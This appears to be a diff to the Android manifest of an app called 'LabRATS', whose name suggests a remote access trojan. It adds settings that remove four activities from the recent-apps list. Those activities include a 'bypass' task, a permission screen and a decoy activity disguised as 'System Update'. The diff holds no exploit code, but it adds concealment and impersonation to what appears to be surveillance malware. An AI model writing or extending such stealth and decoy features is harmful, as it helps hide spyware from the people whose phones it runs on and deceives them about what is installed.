@@ -101,6 +101,7 @@
             android:launchMode="singleInstance"
             android:noHistory="true"
             android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true"
             android:theme="@style/Theme.LabRATS">
         </activity>
 
@@ -111,6 +112,7 @@
             android:taskAffinity="com.labs.labrats.bypass_task"
             android:launchMode="singleInstance"
             android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true"
             android:stateNotNeeded="true"
             android:exported="false" />
 
@@ -119,12 +121,14 @@
             android:name=".PermissionActivity"
             android:theme="@style/Theme.LabRATS.Permissions"
             android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true"
             android:exported="true" />
 
         <activity
             android:name=".DecoyActivity"
             android:exported="false"
             android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="true"
             android:label="System Update"
             android:icon="@drawable/ic_analytics_data"
             android:theme="@style/Theme.LabRATS.Decoy">
